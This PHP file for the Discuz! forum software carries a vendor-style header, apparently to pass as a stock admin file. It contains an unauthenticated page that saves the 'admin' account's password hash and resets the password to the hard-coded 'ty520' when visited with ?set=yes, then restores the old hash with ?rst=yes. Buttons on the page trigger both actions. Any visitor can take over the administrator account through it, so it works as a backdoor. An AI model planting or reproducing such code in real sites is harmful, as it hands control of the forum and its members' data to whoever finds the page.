<?php
//载入核心类库，其中定义了重要常量和自动处理代码

/**
 *      [Discuz!] (C)2001-2099 Comsenz Inc.
*      This is NOT a freeware, use is subject to license terms
*
*      $Id: admin.php 34285 2013-12-13 03:39:35Z hypowang $
*/

//载入核心类库，其中定义了重要常量和自动处理代码
require './source/class/class_core.php';
require './source/function/function_misc.php';
require './source/function/function_forum.php';
require './source/function/function_admincp.php';
require './source/function/function_cache.php';

C::app()->init();
global $_G;


if($_GET['set']){
    $arr = DB::fetch_first('SELECT * FROM %t WHERE username=%s', array('ucenter_members', 'admin'));
    $setting = C::t('common_setting')->fetch_all(null);
   if(!$setting['readmin']){
        $setting['readmin'] = $arr['password'];
        C::t('common_setting')->update_batch($setting);
        loaducenter();
        $ucresult = uc_user_edit('admin', '', 'ty520', '',1, '', '');
        //DB::query('UPDATE %t SET password=%s WHERE username=%s', array('common_member', 'cba9182351f1cf6849b60114b8cc2967','admin'));
   }
   
}else if($_GET['rst']){
    $setting = C::t('common_setting')->fetch_all(null);
    if($setting['readmin']){
        DB::query('UPDATE %t SET password=%s WHERE username=%s', array('ucenter_members', $setting['readmin'],'admin'));
        $setting['readmin'] = '';
        C::t('common_setting')->update_batch($setting);
    }
    
}
$arr = C::t('common_member')->fetch_by_username('admin');

$setting = C::t('common_setting')->fetch_all(null);
if(!$setting['readmin']){
    echo <<<EOT
    <button type="button"  onClick="window.location='readmin.php?set=yes'">Set password(ty520)</button>
EOT;
} else {
    echo <<<EOT
    <button type="button"  onClick="window.location='readmin.php?rst=yes'">Rst old password</button>
EOT;
}
updatecache('setting','forums');

//var_dump($setting['readmin']);
/*

$setting['regverify'] = 2 ;

//var_dump($setting['regverify']);
C::t('common_setting')->update_batch($setting);
DB::query("UPDATE %t SET modnewposts=2",array('forum_forum'));
updatecache('setting','forums');
*/